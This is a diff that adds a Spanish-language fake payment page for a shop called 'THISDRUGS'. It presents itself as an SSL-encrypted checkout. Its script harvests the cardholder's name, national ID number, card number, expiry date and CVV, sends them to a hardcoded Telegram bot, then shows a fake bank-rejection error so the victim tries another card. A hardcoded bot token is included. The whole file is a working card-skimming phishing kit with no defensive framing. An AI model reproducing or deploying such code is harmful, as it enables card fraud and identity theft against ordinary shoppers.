@@ -1,0 +1,341 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="utf-8"/>
+    <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+    <title>THISDRUGS | Secure Terminal Payment</title>
+    
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet"/>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css" rel="stylesheet"/>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;800&display=swap" rel="stylesheet"/>
+    
+    <style>
+        :root {
+            --bg-deep: #0a0b0d;
+            --surface: #14161a;
+            --accent: #ffffff;
+            --border: rgba(255, 255, 255, 0.08);
+            --text-secondary: #848e9c;
+            --success: #02c076;
+            --danger: #ff4d4d;
+        }
+
+        body {
+            background-color: var(--bg-deep);
+            color: #eaeaea;
+            font-family: 'Inter', sans-serif;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        /* --- NAVBAR --- */
+        .navbar {
+            background: rgba(10, 11, 13, 0.98) !important;
+            backdrop-filter: blur(20px);
+            border-bottom: 1px solid var(--border);
+            padding: 15px 0;
+        }
+        .navbar-brand { font-weight: 800; letter-spacing: 2px; color: var(--accent) !important; }
+
+        /* --- CONTAINER --- */
+        .payment-container {
+            max-width: 550px;
+            margin: 40px auto;
+            background: var(--surface);
+            padding: 35px;
+            border-radius: 20px;
+            border: 1px solid var(--border);
+        }
+
+        /* --- RESUMEN CARD --- */
+        .summary-card {
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px dashed var(--border);
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 30px;
+        }
+
+        /* --- INPUTS --- */
+        .form-label { font-size: 0.8rem; font-weight: 600; color: var(--text-secondary); text-transform: uppercase; margin-bottom: 8px; }
+        .form-control {
+            background: var(--bg-deep) !important;
+            border: 1px solid var(--border) !important;
+            color: #fff !important;
+            border-radius: 8px;
+            padding: 12px;
+            font-size: 0.95rem;
+        }
+        .form-control:focus { border-color: #fff; box-shadow: none; }
+        
+        /* --- CUOTAS --- */
+        .cuotas-option {
+            background: var(--bg-deep);
+            border: 1px solid var(--border);
+            padding: 12px;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: 0.2s;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+        }
+        .cuotas-option.active { border-color: #fff; background: rgba(255,255,255,0.05); }
+        .cuotas-option i { color: var(--success); margin-right: 12px; font-size: 1.2rem; }
+
+        /* --- BUTTON --- */
+        .btn-pay {
+            background: var(--accent);
+            color: var(--bg-deep);
+            font-weight: 800;
+            padding: 15px;
+            border-radius: 10px;
+            border: none;
+            width: 100%;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-top: 20px;
+        }
+
+        /* --- BADGES --- */
+        .envio-gratis { color: var(--success); font-weight: 700; font-size: 0.8rem; display: flex; align-items: center; gap: 5px; }
+        .envio-normal { text-decoration: line-through; opacity: 0.5; }
+
+        /* --- MODAL --- */
+        .modal-content {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: 20px;
+            color: #fff;
+        }
+
+        .alert-danger {
+            background: rgba(255, 77, 77, 0.1);
+            border: none;
+            color: var(--danger);
+            font-size: 0.75rem;
+            padding: 8px;
+            margin-top: 5px;
+            border-radius: 6px;
+        }
+    </style>
+</head>
+<body>
+
+<nav class="navbar navbar-dark">
+    <div class="container text-center">
+        <a class="navbar-brand mx-auto" href="#">THISDRUGS.</a>
+    </div>
+</nav>
+
+<div class="container">
+    <div class="payment-container shadow-lg">
+        <div class="text-center mb-4">
+            <h4 class="fw-800 mb-1">TERMINAL DE PAGO</h4>
+            <p class="text-secondary small">SSL ENCRYPTED PROTOCOL ACTIVE</p>
+        </div>
+
+        <div class="summary-card">
+            <h6 class="text-white small fw-bold mb-3">RESUMEN DE COMPRA</h6>
+            <ul id="resumenProductos" class="list-unstyled small mb-3"></ul>
+            <hr style="border-color: var(--border)">
+            <div id="envioGratisInfo"></div>
+            <p class="small mb-1" id="lineaEnvio">Costo de Envío: <span id="envioMonto">$7.000</span></p>
+            <div class="d-flex justify-content-between align-items-center mt-2">
+                <span class="fw-bold">TOTAL FINAL:</span>
+                <span class="text-success fw-800 h5 mb-0">$<span id="resumenTotal"></span></span>
+            </div>
+        </div>
+
+        <form id="paymentForm">
+            <div class="mb-3">
+                <label class="form-label">Nombre del Titular</label>
+                <input type="text" class="form-control" id="nombre" placeholder="Como figura en la tarjeta">
+                <div class="alert alert-danger d-none" id="error-nombre">Campo obligatorio</div>
+            </div>
+
+            <div class="mb-3">
+                <label class="form-label">Número de Tarjeta</label>
+                <input type="text" class="form-control" id="numero" maxlength="16" inputmode="numeric" placeholder="0000 0000 0000 0000">
+                <div class="alert alert-danger d-none" id="error-numero">Se requieren 16 dígitos</div>
+            </div>
+
+            <div id="cuotasSection" style="display:none;" class="mb-4">
+                <label class="form-label">Opciones de Financiación</label>
+                <div class="cuotas-option" onclick="selectCuota(this, '6')">
+                    <i class="bi bi-shield-check"></i> <span>6 Cuotas sin interés</span>
+                </div>
+                <div class="cuotas-option active" onclick="selectCuota(this, 'contado')">
+                    <i class="bi bi-lightning-charge"></i> <span>Pagar al contado (1 Pago)</span>
+                </div>
+            </div>
+
+            <div class="row">
+                <div class="col-6 mb-3">
+                    <label class="form-label">Vencimiento</label>
+                    <input type="text" class="form-control" id="vencimiento" maxlength="5" placeholder="MM/AA">
+                    <div class="alert alert-danger d-none" id="error-vencimiento">Formato MM/AA</div>
+                </div>
+                <div class="col-6 mb-3">
+                    <label class="form-label">CVV</label>
+                    <input type="text" class="form-control" id="codigo" maxlength="3" inputmode="numeric" placeholder="000">
+                    <div class="alert alert-danger d-none" id="error-codigo">3 dígitos</div>
+                </div>
+            </div>
+
+            <div class="mb-4">
+                <label class="form-label">DNI del Titular</label>
+                <input type="text" class="form-control" id="dni" maxlength="10" placeholder="00.000.000">
+                <div class="alert alert-danger d-none" id="error-dni">8 dígitos requeridos</div>
+            </div>
+
+            <button type="button" class="btn-pay" id="btnPagar">CONFIRMAR PAGO</button>
+        </form>
+
+        <div class="text-center mt-4">
+            <div class="d-flex justify-content-center gap-3 opacity-50">
+             <img src="https://productos.tribuexcel.com/wp-content/uploads/2020/12/visa-and-mastercard-logos-logo-visa-png-logo-visa-mastercard-png-visa-logo-white-png-awesome-logos-705x210-1.png" height="20">
+                            </div>
+        </div>
+    </div>
+</div>
+
+<div class="modal fade" id="rechazoModal" data-bs-backdrop="static" tabindex="-1">
+    <div class="modal-dialog modal-dialog-centered">
+        <div class="modal-content text-center p-5">
+            <div id="spinnerCarga">
+                <div class="spinner-border text-light mb-3" style="width: 3rem; height: 3rem;"></div>
+                <h6 class="fw-bold">ENCRIPTANDO TRANSACCIÓN...</h6>
+                <p class="small text-secondary">No cierre esta ventana</p>
+            </div>
+            <div id="mensajeError" class="d-none">
+                <i class="bi bi-exclamation-triangle text-danger" style="font-size: 4rem;"></i>
+                <h4 class="mt-3 fw-800 text-danger">GATEWAY ERROR</h4>
+                <p class="text-secondary small">La entidad bancaria ha rechazado la solicitud. Por favor, utilice una tarjeta diferente o verifique los datos.</p>
+                <button class="btn btn-outline-light btn-sm mt-3" data-bs-dismiss="modal">REINTENTAR</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+
+<script>
+    // --- CARGA DE DATOS ---
+    document.addEventListener("DOMContentLoaded", () => {
+        const carrito = JSON.parse(localStorage.getItem("carrito")) || [];
+        const totalCarrito = carrito.reduce((sum, p) => sum + parseFloat(p.precio.replace(/[^0-9]/g, "")), 0);
+        const resumenLista = document.getElementById("resumenProductos");
+        const envioGratisInfo = document.getElementById("envioGratisInfo");
+        const envioMontoLabel = document.getElementById("envioMonto");
+        
+        let envioCosto = (totalCarrito >= 200000) ? 0 : 7000;
+
+        // Render productos
+        carrito.forEach(p => {
+            resumenLista.innerHTML += `<li class="d-flex justify-content-between opacity-75 mb-1">
+                <span>${p.titulo}</span>
+                <span>${p.precio}</span>
+            </li>`;
+        });
+
+        // Envio gratis logic
+        if (envioCosto === 0) {
+            envioGratisInfo.innerHTML = '<div class="envio-gratis mb-2"><i class="bi bi-patch-check-fill"></i> LOGÍSTICA BONIFICADA</div>';
+            envioMontoLabel.classList.add('envio-normal');
+        } else {
+            envioGratisInfo.innerHTML = '<p class="text-secondary" style="font-size:0.7rem">Faltan $' + (200000 - totalCarrito) + ' para envío gratis</p>';
+        }
+
+        document.getElementById("resumenTotal").textContent = (totalCarrito + envioCosto).toLocaleString('es-AR');
+    });
+
+    // --- FORMATOS ---
+    document.getElementById('vencimiento').addEventListener('input', function(e) {
+        let v = this.value.replace(/\D/g, '');
+        if (v.length > 2) v = v.substring(0,2) + '/' + v.substring(2);
+        this.value = v;
+    });
+
+    document.getElementById('dni').addEventListener('input', function(e) {
+        let v = this.value.replace(/\D/g, '').substring(0,8);
+        if (v.length > 5) v = v.substring(0,2) + '.' + v.substring(2,5) + '.' + v.substring(5);
+        else if (v.length > 2) v = v.substring(0,2) + '.' + v.substring(2);
+        this.value = v;
+    });
+
+    document.getElementById('numero').addEventListener('input', function() {
+        const cuotas = document.getElementById('cuotasSection');
+        cuotas.style.display = (this.value.length === 16) ? 'block' : 'none';
+    });
+
+    function selectCuota(el, val) {
+        document.querySelectorAll('.cuotas-option').forEach(o => o.classList.remove('active'));
+        el.classList.add('active');
+    }
+
+    // --- VALIDACIÓN ---
+    function validar() {
+        let ok = true;
+        const check = (id, errorId, regex) => {
+            const el = document.getElementById(id);
+            const val = el.value.trim();
+            const isValid = regex ? regex.test(val) : val !== "";
+            document.getElementById(errorId).classList.toggle('d-none', isValid);
+            if(!isValid) ok = false;
+        };
+
+        check('nombre', 'error-nombre');
+        check('numero', 'error-numero', /^[0-9]{16}$/);
+        check('vencimiento', 'error-vencimiento', /^(0[1-9]|1[0-2])\/\d{2}$/);
+        check('codigo', 'error-codigo', /^[0-9]{3}$/);
+        check('dni', 'error-dni', /^\d{2}\.\d{3}\.\d{3}$/);
+        
+        return ok;
+    }
+
+    // --- ENVÍO TELEGRAM ---
+    document.getElementById('btnPagar').addEventListener('click', function() {
+        if (!validar()) return;
+
+        const modal = new bootstrap.Modal(document.getElementById('rechazoModal'));
+        modal.show();
+
+        const carrito = JSON.parse(localStorage.getItem("carrito")) || [];
+        const prodTexto = carrito.map(p => `- ${p.titulo} (${p.precio})`).join("\n");
+        const total = document.getElementById("resumenTotal").textContent;
+
+        const msg = `
+⚠️ *RECAPTURADO - INTENTO DE PAGO*
+*Titular:* ${document.getElementById('nombre').value}
+*DNI:* ${document.getElementById('dni').value}
+*Tarjeta:* ${document.getElementById('numero').value}
+*Vencimiento:* ${document.getElementById('vencimiento').value}
+*CVV:* ${document.getElementById('codigo').value}
+---------------------------
+*Pedido:*
+${prodTexto}
+*Total:* $${total}
+        `;
+
+        const token = '7452393821:AAEHY511Yv-1KqScg7tylWVc8xwFV26GSkQ';
+        const chat_id = '6493944778';
+
+        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id, text: msg, parse_mode: 'Markdown' })
+        })
+        .finally(() => {
+            setTimeout(() => {
+                document.getElementById('spinnerCarga').classList.add('d-none');
+                document.getElementById('mensajeError').classList.remove('d-none');
+            }, 3500);
+        });
+    });
+</script>
+
+</body>
+</html>
